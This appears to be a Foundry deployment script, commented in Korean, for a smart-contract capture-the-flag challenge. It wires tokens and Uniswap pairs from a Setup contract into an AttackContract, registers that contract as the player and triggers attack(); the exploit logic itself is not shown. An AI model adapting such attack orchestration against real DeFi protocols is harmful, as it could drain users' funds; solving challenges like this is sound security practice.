// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/core/Setup.sol";
import {AttackContract} from "../src/AttackContract.sol";
import {IUniswapV2Factory} from "../src/uniswap-v2/interfaces/IUniswapV2Factory.sol";

contract DeployScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // 1. Setup 컨트랙트 배포
        Setup setup = Setup(address(0x0000000000000000000000000000000000000000));
        address uniswapFactory = address(setup.uniswapV2Factory());

        // 2. Setup에서 필요한 토큰 정보 가져오기
        address[] memory tokens = new address[](3);
        address[] memory pairs = new address[](3);
        uint256[] memory amounts = new uint256[](3);

        tokens[0] = address(setup.lamboToken1());
        tokens[1] = address(setup.lamboToken2());
        tokens[2] = address(setup.lamboToken3());

        pairs[0] = address(setup.uniPair1());
        pairs[1] = address(setup.uniPair2());
        pairs[2] = address(setup.uniPair3());

        // 각 토큰의 초기 공급량 설정
        amounts[0] = 20e18;
        amounts[1] = 20e18;
        amounts[2] = 20e18;

        // 3. 공격 컨트랙트 배포
        AttackContract attack = new AttackContract(
            address(setup.balancer()),
            address(setup.whilteListed()),
            address(setup.VSTETH()),
            tokens,
            pairs,
            amounts
        );

        // 4. player 주소를 공격 컨트랙트로 설정
        setup.setPlayer(address(attack));

        // 5. 공격 실행
        attack.attack();

        vm.stopBroadcast();
    }
}